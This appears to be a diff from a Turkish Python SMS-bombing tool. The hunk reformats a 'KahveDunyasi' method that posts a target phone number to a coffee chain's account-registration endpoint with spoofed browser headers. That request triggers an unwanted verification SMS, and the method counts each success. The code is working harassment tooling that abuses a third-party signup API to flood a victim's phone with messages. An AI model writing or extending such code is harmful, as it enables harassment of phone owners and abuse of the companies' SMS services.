@@ -168,18 +168,35 @@ class SendSms():
                 f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com"
             )
 
-    def KahveDunyasi(self):    
-        try:    
+    def KahveDunyasi(self):
+        try:
             url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
-            json={"countryCode": "90", "phoneNumber": self.phone}
+            headers = {
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Content-Type": "application/json",
+                "X-Language-Id": "tr-TR",
+                "X-Client-Platform": "web",
+                "Origin": "https://www.kahvedunyasi.com",
+                "Dnt": "1",
+                "Sec-Gpc": "1",
+                "Referer": "https://www.kahvedunyasi.com/",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-site",
+                "Priority": "u=0",
+                "Te": "trailers",
+                "Connection": "keep-alive"
+            }
+            json = {"countryCode": "90", "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["processStatus"] == "Success":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kahvedunyasi.com")
                 self.adet += 1
             else:
                 raise
-        except:    
+        except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kahvedunyasi.com")
 
     def Evidea(self):
